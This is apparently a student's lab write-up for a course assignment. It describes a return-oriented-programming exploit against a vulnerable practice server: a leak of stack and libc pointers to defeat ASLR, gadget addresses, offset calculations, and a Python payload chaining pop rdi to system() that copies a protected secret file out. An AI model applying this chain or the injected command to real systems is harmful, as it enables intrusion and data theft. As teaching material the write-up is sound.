# Intro

In Prset01, we were doing an exploit without DEP or even ASLR, and the exploit was much more simple than the one needed here, as the stack can be executed.
In this assignment we are doing a Code Reuse attack, which is controlling execution flow using an existing code to evade Data Execution Prevention (DEP) which makes the stack un-executable.  One of the techniques we have to use in this assignment is Return-Oriented-Programming, which is a form of reuse attack, where a set of instructions that ends in a return (ret;) instruction is searched in the binary of the program and used to construct a payload.  

# Vulnerability 
First, I examined the source code of prset04, and learned how it works. Creating a local instance of prset04, and gdb prset <pid> was so helpful in debugging the program and determine circumstance of failure.  

## Running the program, 
./prset -- port 1111


## Testing 
The way I was testing is by dumping random values and pass it through the server on the listening port, then examine outputs using nc.

 spatialisotope@prset04:~/prset04$ echo '7777777' | nc localhost 1111 | hexdump -C -v -n 40
00000000  01 00 00 00 00 00 00 00  a8 4a c2 12 9e 7f 00 00  |.........J......|
00000010  10 aa 56 40 ff 7f 00 00  04 00 00 00 00 00 00 00  |..V@............|
00000020  c8 bb 37 12 9e 7f 00 00                           |..7.....|
00000028
spatialisotope@prset04:~/prset04$ 

As It turns out the application leaks out this output of the buffer, which contains a lot of information from the stack when it get a data of length (7-1043) due to unable to read a lot or read more than buffer. 

## Detecting Vulnerability and way can be exploit
 
In the code, the vulnerability existed in OnClient(), specifically : ReadBytes() > recv(), which can be overflowed and place an arbitrary return address of our own.

```
(gdb) i f
Stack level 0, frame at 0x7fff653045a0:
 rip = 0x409bb9 in OnClient (prset04.cpp:205); saved rip = 0x40a5e5
 called by frame at 0x7fff65304820
 source language c++.
 Arglist at 0x7fff65304590, args: sk=4
 Locals at 0x7fff65304590, Previous frame's sp is 0x7fff653045a0
 Saved registers:
  rbp at 0x7fff65304590, rip at 0x7fff65304598
(gdb) p &buf
$3 = (char (*)[1024]) 0x7fff65304180
(gdb) p/x 0x7fff65304598-0x7fff65304180
$4 = 0x418
```

Here we just determined, how far the buffer address is from the return address.
So we will use this in attack later.
Examining more on why it got outputs only with data of length (7-1043) If it less than 8 somehow it fails in reading the length of the message. And if we give too much:

	(gdb) p &(ptr - buf + n)
Attempt to take address of value not located in memory.

And actually 0x418= 1048 explains it clearly. So this is an overflow on the buffer.


So the overall implementation indicates an existing leaking pointer, and can be used to do memory disclosure attack, which I will talk about in a separate section.

One important note about recve, it does not terminate on nulls! Because it works with opening files, it's very good for us and have more flexibility in injecting the payload. 

# GOAL

We only need to consider, 1) stack is not executable, 2) libc addresses are randomized on every execution.

**Our goal is**:  Inject proper chain of gadgets, with correct libc functions addresses, or any form of using existing code to perform our intended attack.

# First Attempt

First, I had to look up the binary and look for useful set of instruction (gadgets) by objdump -d first, then I figure out i's best to use some tools which sort them out and make it more convenient to find.  The tool I have used is called ROPgadget. 


	I have found this list of gadgets:

```		 
#   0x0000000000426bf3 : pop rdi ; ret
#   0x0000000000426bf1 : pop rsi ; pop r15 ; ret
#   0x0000000000412ed2 : pop rdx ; ret 0
#   0x000000000040bd1c : mov rax, rdi ; pop rbp ; ret	
```

Just to notice, I have not used them all in the final exploit, only the first one.  And second for dup2().

## Disable ASLR
One of the things I have used too is disabling ASLR, by running prset04 under setarch, I was trying to make things easier at first and this makes the address of buffer is static even with multiple executions.   

So by setting setarch, then using gdb to debug a running process
	$ gdb prset04 <PID>
	set follow-fork-mode child
	b On Client

## Inject payload
Then our payload will be injected using simple netcat connection:

Python2 ropexploit.py | nc localhost 1111 

## Planning the exploit 

By examining the stack when the buffer overflow occur, and doing several debugging, it turns out that the way I should do is like this:
- Overflow the buffer with 0x418 length of whatever..
- Put address of the first chain of gadgets
- The ret; instruction on each of them will make ESP works as the instruction pointer and each time a gadget is loaded, then next provided address will be the one returned to.
- Put address of /bin/sh
- Put address of system()


The first gadget seem to be all what I need + an address to system() + some where to place /bin/sh

```
[G1]  :  0x0000000000426bf3 : pop rdi ; ret
```

My first attempt was trying to this:
```
[0x418---------------------------------][G1][&pointer_to /bin/sh][&SYSTEM()] 
```
	
To make it easier I first send the string /bin/sh\x00 with null terminated then use the buffer address as the pointer to be loaded into rdi.

## Attack construction 
	
So the attack will be like this:
```
"/bin/sh\x00"[..padding..]
[G1] [&buf] [system]
```
The way I get system is by looking up the offset of system in the libc library, and look up /proc/pid/maps to figure out where libc is loaded for that particular program. 

### Getting addresses of libc + offset of system()
```
spatialisotope@prset04:~/rop$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>' 
0000000000046640 W system
spatialisotope@prset04:~/rop$ ps -al
F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD
0 R  1000  4068  3928 92  80   0 -  8151 -      pts/0    00:40:47 prset04
0 S  1000  4108  4065  0  80   0 - 18888 poll_s pts/1    00:00:00 gdb
1 t  1000  4115  4068  0  80   0 -  8151 ptrace pts/0    00:00:00 prset04
0 R  1000  4118  4087  0  80   0 -  1785 -      pts/2    00:00:00 ps
spatialisotope@prset04:~/rop$ grep libc /proc/4115/maps
7fb8bd68f000-7fb8bd84a000 r-xp 00000000 00:1e 1171                       /lib/x86_64-linux-gnu/libc-2.19.so
7fb8bd84a000-7fb8bda49000 ---p 001bb000 00:1e 1171                       /lib/x86_64-linux-gnu/libc-2.19.so
7fb8bda49000-7fb8bda4d000 r--p 001ba000 00:1e 1171                       /lib/x86_64-linux-gnu/libc-2.19.so
7fb8bda4d000-7fb8bda4f000 rw-p 001be000 00:1e 1171                       /lib/x86_64-linux-gnu/libc-2.19.so
spatialisotope@prset04:~/rop$ 
```

So,  `0x7fb8bd68f000 +  0x46640`
Will give us address to `system()`
And I confirmed that in `gdb by x/x etc`..

Launching this, I was able to get the shell opened, but I see it opened on the terminal where prset04 is executed. This is because we haven’t redirect stdiot/stdin to the opened socket.

**Here my first attempt ended!**


# Second Attempt -  Memory Disclosure & Evade ASLR
I spent most of the time working on this actually, the memory disclosure seems one of the hardest challenges but it turns at the end the solution was simpler that I thought.   I was going towards GOT/PLT overwrite or dereferencing… 

The issue here, the prset04 that is listening on 12000 run by different user and we cannot see `/proc/maps` for that process. So, the previous works only offline, but still gave us a lot of information about how we should proceed.  From several execution and trails and see many of buffer addresses & libc addresses. I determined that there is no direct calculation to determine libc addresses from buffer address.   

Taking a look at the output of the leaked information:


```
spatialisotope@prset04:~/prset04$ echo '7777777' | nc localhost 1111 | hexdump -C -v -n 40
00000000  01 00 00 00 00 00 00 00  a8 4a c2 12 9e 7f 00 00  |.........J......|
00000010  10 aa 56 40 ff 7f 00 00  04 00 00 00 00 00 00 00  |..V@............|
00000020  c8 bb 37 12 9e 7f 00 00                           |..7.....|
00000028
spatialisotope@prset04:~/prset04$ 
```

And at the same time by looking to the loaded libc address and buffer address from gdb, I figure out a quick way to determine needed offset without doing several calculations to reconstruct memory mappings.  

The trick I used is that looking to base addresses that appeared in the leaked information, and I found two kinds:
1. one will be used to determine buffer address 
2. the other will be used to determine libc address.

I feel I could use one, but it didn’t work for me just because each time, libc  does not get loaded on the same offset from the base address, this might me something I found called PIE but not sure. 

## Calculating offsets
So, here what I managed to do to figure out the addresses.

```
(gdb) p &buf	
$1 = (char (*)[1024]) 0x7fff1ffd1690

spatialisotope@prset04:~/rop$ grep libc /proc/4144/maps 
7f31bd27e000

spatialisotope@prset04:~/rop$ echo '7777777' | nc localhost 1111 | hexdump -C -v -n 40
00000000  01 00 00 00 00 00 00 00  a8 2a 93 be 31 7f 00 00  |.........*..1...|
00000010  60 16 fd 1f ff 7f 00 00  04 00 00 00 00 00 00 00  |`...............|
00000020  c8 9b 08 be 31 7f 00 00                           |....1...|
00000028
```

First address is positioned as 3rd pointer=`0x7fff1ffd1660`
Second address is the 5th = `0x7f31be089bc8`

Calculating needed offsets, and actually included a way to print all of this..

```
spatialisotope@prset04:~/rop$ python2 ropexploit.py -p -memory-port 1111
stack=0x7fff1ffd1660+ 0x30
libc=0x7f31be089bc8- 0xe0bbc8
&buf=0x7fff1ffd1690
&libc=0x7f31bd27e000
&system=0x7f31bd2c4640
```

# Final Attempt

Now we got everything working, evading DEP + ASLR with precise locations, we only need to craft the payload.  Giving the issue of not been able to direct stdin/stdout using dup2, I managed to find easier way around this and not even needed to interact with a shell. We know the location of the file, so that’s pretty easy to just cat  /usr/local/share/prset04.secret and write somewhere we can access. 

Here how is the exploit looks like:

```
def csystem():
        return pack('<QQQ', poprdi_addr,  buf_addr, system_addr)


command = "cat /usr/local/share/prset04.secret > /home/spatialisotope/rop/secret\x00"
buf = '/bin/sh\x00'  + command  +  '\x90' * (buf_len-len(command)) + csystem()
```

For some reason, probably because the sloppy implementation of the code, it doesn’t read the first 8 bytes, so the first 8 bytes could be anything.


Then we just need to created a file secret, with write access. And there you have it.
```
spatialisotope@prset04:~/rop$ cat secret 

DzhkOBHQHq+x5lzSX2TJd4r+orFm+KQdf4gBepISBXM=
```

One way was to check whether I was able to make the exploit with correct addresses or not by looking at stat /usr/local/share/prset04.secret this was I was checking whenever the access time changed, it means we got it successfully.

# How to test my exploit 

right now although it's build in to just give it a port and do the reset, i had some issues with piping.
so First determine addresses using `memory_disc.py - port 12000` Then use those addresses first one as `-stack` and second one as `-libc` arguments to my `ropexploit.py`  

Example:

```
python2 memory_disc.py -p 1111
00007fffac708c00
00007f7d9c3dbbc8

python2 ropexploit.py -s -stack 0x00007fffac708c00 -libc 0x00007f7d9c3dbbc8| nc localhost 1111    

// use -c to specify command too 
```
# Extra work

## Extending the Exploit
I did a lot of improvements on the exploit and add several methods to it.

```
spatialisotope@prset04:~/prset04/exploit$ python ropexploit.py --help
usage: ropexploit.py [-h] [-s] [-stack STACK] [-libc LIBC]
                     [-memory-port MEMORY_PORT] [-p] [-c COMMAND]
                     [-secret SECRET]

optional arguments:
  -h, --help            show this help message and exit
  -s, --only-system     Execute only system(), without dup2
  -stack STACK          Set leaked address realative to stack
  -libc LIBC            Spet leaked address relative to libc
  -memory-port MEMORY_PORT
                        Set port number, it will Exploit memory vulnerability
                        automatically
  -p, --print-address   Print addresses, and create solution.json
  -c COMMAND, --command COMMAND
                        Specific command to penetrate vulnerable server
  -secret SECRET        set secret file localtion, to obtain secret value for
                        printing solution
spatialisotope@prset04:~/prset04/exploit$ 
```

I tried, setuid, dup2 just for curiosity.. 

Another way I was thinking is to make a reconnect back to some code listening, but I was able to do this in an experiments but did not want to do it on this program, just in case not miss something out because I did got crash the system while doing other experiments.

## Other Experiments

I have done several client /server tests and client based program that simulate the actual ROP attack by simply using the inline ASM and provide it with libc system addresses + buffer addresses, so  I safe time not from trying directly on prset04. 

So I was testing things like that

```
			asm("push $0x4\n");
                        asm("push $0x1\n");
                        asm("push $0x1\n");
                        asm("push $0x4\n");
                        asm("push $0x0\n");
                        asm("push $0x0\n");
                        asm("pop %rsi\n");
                        asm("pop %r15\n");
                        asm("pop %rdi\n");
                        void (*d2)(void) = 0x7ffff7b00fe0;
                        //asm(//"mov $0x0, %rsi\n"
                        //"mov $0x0, %r15\n"
                        //"mov $0x4, %rdi\n");
                        d2();
                        asm("pop %rsi\n");
                        asm("pop %r15\n");
                        asm("pop %rdi\n");
                        //asm("mov $0x1, %rsi\n"
                        //"mov $0x0, %r15\n"
                        //"mov $0x4, %rdi\n");
                        d2();
                        //     dup2(new, 0);
                        //   dup2(new, 1);
                        // dup2(new, 2);
                        asm("mov $0x1, %eax");
                        asm("mov $0xff, %ecx");
                        asm("mov $0x1, %ebx");

                        char binsh[] = "/bin/sh";
                        printf(  "mov %p, %rsi", &binsh[0] );
                        asm("mov $0x7fffffffeae0, %rdi");
                        void (*ss)(void)= 0x7ffff7a5b640;
                        ss();
                        //system("/bin/sh");
                        exit(0);
```

I thought there was something wrong with my way of doing DUP2 but after your explanations now I know why it didn’t work.

# Major Things Learned 

First of all, I have to say; I haven’t learned that much during a homework assignment as this time. Although I had spent lot of time trying to get a solution, reaching the accomplishment and the gained knowledge and experience during the work was so thrilling and motivate.    I never knew how Elf files segmentations works exactly, how libc and dynamic libraries are relocated to virtual address. And the ideas of GOT/PLT where one have write/but not read and other have opposite.   I improved my skills with python more and more, and got practiced real world example of how ROP can be done.  I actually delved into more details of advanced techniques, but still didn’t get how I can determine base address of the program given one return address. And still my question remains, does this only applies to Position Independent Program, and whither our case falls under that or not.